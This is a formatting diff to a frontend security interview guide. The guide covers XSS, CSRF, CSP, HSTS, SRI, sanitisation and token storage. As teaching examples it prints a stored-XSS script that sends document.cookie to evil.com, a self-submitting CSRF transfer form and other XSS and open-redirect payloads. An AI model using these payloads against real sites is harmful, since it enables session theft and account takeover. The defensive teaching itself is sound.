@@ -13,16 +13,19 @@ Frontend security is a critical interview topic because the browser is an inhere
 XSS occurs when an attacker injects malicious scripts that execute in another user's browser context, gaining access to cookies, session tokens, DOM manipulation, and more.
 
 **Stored XSS** (Persistent)
+
 - Malicious script is saved to the server (e.g., in a database).
 - Every user who views the affected page executes the script.
 - Example: an attacker posts a comment containing `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. Every visitor to that page sends their cookies to the attacker.
 
 **Reflected XSS**
+
 - Malicious script is embedded in a URL or form submission.
 - The server reflects the input back in the response without sanitization.
 - Example: `https://example.com/search?q=<script>alert(1)</script>` where the search page renders the query parameter directly.
 
 **DOM-based XSS**
+
 - The vulnerability exists entirely in client-side JavaScript.
 - No server round-trip needed -- the script reads from a source (URL, `postMessage`, localStorage) and writes to a sink (`innerHTML`, `eval`, `document.write`).
 
@@ -37,6 +40,7 @@ document.getElementById('greeting').textContent = `Hello, ${name}!`;
 ```
 
 **XSS Prevention Checklist**:
+
 - Never use `innerHTML` with untrusted data; use `textContent` or framework templating.
 - In React, avoid `dangerouslySetInnerHTML` unless you sanitize first.
 - Encode output according to context (HTML, attribute, JavaScript, URL, CSS).
@@ -54,10 +58,13 @@ CSRF tricks an authenticated user's browser into making unintended requests. Bec
   <input type="hidden" name="to" value="attacker" />
   <input type="hidden" name="amount" value="10000" />
 </form>
-<script>document.forms[0].submit();</script>
+<script>
+  document.forms[0].submit();
+</script>
 ```
 
 **CSRF Prevention**:
+
 - `SameSite=Strict` or `SameSite=Lax` cookies (Lax is the default in modern browsers).
 - Anti-CSRF tokens: server generates a unique token per session, client sends it in a hidden form field or custom header. The server validates it.
 - Check `Origin` or `Referer` headers on the server.
@@ -83,19 +90,20 @@ Content-Security-Policy:
 
 Key directives:
 
-| Directive | Controls |
-|-----------|----------|
+| Directive     | Controls                        |
+| ------------- | ------------------------------- |
 | `default-src` | Fallback for all resource types |
-| `script-src` | JavaScript sources |
-| `style-src` | CSS sources |
-| `img-src` | Image sources |
+| `script-src`  | JavaScript sources              |
+| `style-src`   | CSS sources                     |
+| `img-src`     | Image sources                   |
 | `connect-src` | fetch, XHR, WebSocket endpoints |
-| `frame-src` | iframe sources |
-| `object-src` | plugins (Flash, Java) |
-| `base-uri` | `<base>` element |
-| `form-action` | Form submission targets |
+| `frame-src`   | iframe sources                  |
+| `object-src`  | plugins (Flash, Java)           |
+| `base-uri`    | `<base>` element                |
+| `form-action` | Form submission targets         |
 
 Special values:
+
 - `'self'` -- same origin only.
 - `'none'` -- block everything.
 - `'unsafe-inline'` -- allow inline scripts/styles (weakens CSP significantly).
@@ -106,11 +114,13 @@ Special values:
 **CSP with nonces (recommended)**:
 
 Server generates a random nonce per request:
+
 ```html
 <script nonce="r4nd0m123">
   // This inline script is allowed because nonce matches
 </script>
 ```
+
 ```
 Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
 ```
@@ -120,9 +130,11 @@ Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
 HTTPS encrypts all data in transit, preventing eavesdropping and tampering.
 
 **HSTS (HTTP Strict Transport Security)**:
+
 ```
 Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 ```
+
 - Tells the browser to always use HTTPS for this domain.
 - `preload` enables inclusion in browser preload lists (hardcoded HTTPS-only domains).
 - Without HSTS, the first HTTP request is vulnerable to downgrade attacks.
@@ -135,8 +147,8 @@ SRI ensures that fetched resources (scripts, styles from CDNs) have not been tam
 <script
   src="https://cdn.example.com/lib.js"
   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAMN16a3sE7p8VZ/Bb2gIyP4Y1eSk"
-  crossorigin="anonymous">
-</script>
+  crossorigin="anonymous"
+></script>
 ```
 
 If the file's content changes (e.g., CDN compromise), the browser refuses to execute it.
@@ -148,7 +160,8 @@ When you must render user-generated HTML (rich text editors, markdown), use DOMP
 ```javascript
 import DOMPurify from 'dompurify';
 
-const dirtyHTML = '<p>Hello</p><script>alert("xss")</script><img src=x onerror=alert(1)>';
+const dirtyHTML =
+  '<p>Hello</p><script>alert("xss")</script><img src=x onerror=alert(1)>';
 const cleanHTML = DOMPurify.sanitize(dirtyHTML);
 // Result: '<p>Hello</p><img src="x">'
 // Script tag and onerror attribute are removed
@@ -166,16 +179,17 @@ function SafeHTML({ html }) {
 
 ### Auth Token Storage
 
-| Storage | XSS Safe | CSRF Safe | Auto-sent | Capacity |
-|---------|----------|-----------|-----------|----------|
-| httpOnly Cookie | Yes | No (needs SameSite) | Yes | ~4KB |
-| localStorage | No | Yes | No | ~5-10MB |
-| sessionStorage | No | Yes | No | ~5-10MB |
-| Memory (JS variable) | Partially (lost on refresh) | Yes | No | Unlimited |
+| Storage              | XSS Safe                    | CSRF Safe           | Auto-sent | Capacity  |
+| -------------------- | --------------------------- | ------------------- | --------- | --------- |
+| httpOnly Cookie      | Yes                         | No (needs SameSite) | Yes       | ~4KB      |
+| localStorage         | No                          | Yes                 | No        | ~5-10MB   |
+| sessionStorage       | No                          | Yes                 | No        | ~5-10MB   |
+| Memory (JS variable) | Partially (lost on refresh) | Yes                 | No        | Unlimited |
 
 **Best practice**: Use httpOnly, Secure, SameSite=Strict cookies for session tokens. The token never touches JavaScript, so XSS cannot steal it. Pair with CSRF protection (SameSite + anti-CSRF token for older browsers).
 
 **If you must use localStorage** (e.g., SPA with third-party auth):
+
 - Use short-lived access tokens (15 minutes).
 - Store refresh tokens in httpOnly cookies only.
 - Implement aggressive CSP to minimize XSS risk.
@@ -183,26 +197,31 @@ function SafeHTML({ html }) {
 ### Iframe Security
 
 **X-Frame-Options header**:
+
 ```
 X-Frame-Options: DENY          # Cannot be embedded in any iframe
 X-Frame-Options: SAMEORIGIN    # Only same-origin can embed
 ```
 
 **CSP frame-ancestors** (modern replacement):
+
 ```
 Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
 ```
 
 **Sandbox attribute** (for embedding untrusted content):
+
 ```html
 <iframe
   src="https://untrusted.com"
   sandbox="allow-scripts allow-same-origin"
-  referrerpolicy="no-referrer">
+  referrerpolicy="no-referrer"
+>
 </iframe>
 ```
 
 Sandbox restrictions (all applied by default, selectively relaxed):
+
 - `allow-scripts` -- permit JavaScript execution.
 - `allow-same-origin` -- allow the frame to use its real origin.
 - `allow-forms` -- permit form submission.
@@ -235,6 +254,7 @@ https://example.com/login?redirect=https://evil.com
 After login, the user is redirected to `evil.com`, which may be a phishing page that looks identical to your site.
 
 **Prevention**:
+
 ```javascript
 function safeRedirect(url) {
   const parsed = new URL(url, window.location.origin);
@@ -253,6 +273,7 @@ function safeRedirect(url) {
 Third-party packages are a major attack surface. A single compromised dependency in your supply chain can inject malicious code into your application.
 
 **Prevention**:
+
 - Run `npm audit` regularly and fix vulnerabilities.
 - Use `npm audit --omit=dev` for production-relevant issues.
 - Lock dependency versions with `package-lock.json`.
@@ -263,6 +284,7 @@ Third-party packages are a major attack surface. A single compromised dependency
 ### Secrets in Frontend Code
 
 **Everything in frontend code is public**. This includes:
+
 - API keys bundled in JavaScript.
 - Environment variables prefixed with `NEXT_PUBLIC_` or `VITE_`.
 - Hardcoded tokens, passwords, or connection strings.
@@ -362,8 +384,23 @@ import DOMPurify from 'dompurify';
 
 const SAFE_CONFIG = {
   ALLOWED_TAGS: [
-    'p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li',
-    'h1', 'h2', 'h3', 'blockquote', 'code', 'pre', 'img',
+    'p',
+    'br',
+    'b',
+    'i',
+    'em',
+    'strong',
+    'a',
+    'ul',
+    'ol',
+    'li',
+    'h1',
+    'h2',
+    'h3',
+    'blockquote',
+    'code',
+    'pre',
+    'img',
   ],
   ALLOWED_ATTR: ['href', 'target', 'rel', 'src', 'alt', 'class'],
   ALLOW_DATA_ATTR: false,
@@ -517,17 +554,17 @@ done
 
 ## Quick Reference
 
-| Threat | Attack Vector | Primary Defense | Secondary Defense |
-|--------|--------------|-----------------|-------------------|
-| Stored XSS | Malicious input saved to DB | Output encoding, CSP | Input validation, DOMPurify |
-| Reflected XSS | Malicious input in URL | Output encoding, CSP | Input validation |
-| DOM XSS | Client-side sink (innerHTML) | textContent, framework escaping | CSP nonces |
-| CSRF | Forged cross-origin requests | SameSite cookies | Anti-CSRF tokens |
-| Clickjacking | Transparent iframe overlay | X-Frame-Options / frame-ancestors | Frame-busting JS |
-| Open Redirect | Untrusted redirect URL | URL allowlist validation | Relative paths only |
-| CDN Tampering | Compromised third-party script | Subresource Integrity (SRI) | Self-hosting |
-| Token Theft | XSS reads localStorage | httpOnly cookies | Short-lived tokens |
-| Secret Exposure | API keys in frontend bundle | Backend proxy | Environment variables (server-side) |
-| Dependency Attack | Malicious npm package | npm audit, lockfiles | Snyk, Socket.dev |
-| Man-in-the-Middle | HTTP downgrade | HTTPS + HSTS | HSTS preload |
-| Iframe Injection | Embedding malicious frames | CSP frame-src | sandbox attribute |
+| Threat            | Attack Vector                  | Primary Defense                   | Secondary Defense                   |
+| ----------------- | ------------------------------ | --------------------------------- | ----------------------------------- |
+| Stored XSS        | Malicious input saved to DB    | Output encoding, CSP              | Input validation, DOMPurify         |
+| Reflected XSS     | Malicious input in URL         | Output encoding, CSP              | Input validation                    |
+| DOM XSS           | Client-side sink (innerHTML)   | textContent, framework escaping   | CSP nonces                          |
+| CSRF              | Forged cross-origin requests   | SameSite cookies                  | Anti-CSRF tokens                    |
+| Clickjacking      | Transparent iframe overlay     | X-Frame-Options / frame-ancestors | Frame-busting JS                    |
+| Open Redirect     | Untrusted redirect URL         | URL allowlist validation          | Relative paths only                 |
+| CDN Tampering     | Compromised third-party script | Subresource Integrity (SRI)       | Self-hosting                        |
+| Token Theft       | XSS reads localStorage         | httpOnly cookies                  | Short-lived tokens                  |
+| Secret Exposure   | API keys in frontend bundle    | Backend proxy                     | Environment variables (server-side) |
+| Dependency Attack | Malicious npm package          | npm audit, lockfiles              | Snyk, Socket.dev                    |
+| Man-in-the-Middle | HTTP downgrade                 | HTTPS + HSTS                      | HSTS preload                        |
+| Iframe Injection  | Embedding malicious frames     | CSP frame-src                     | sandbox attribute                   |
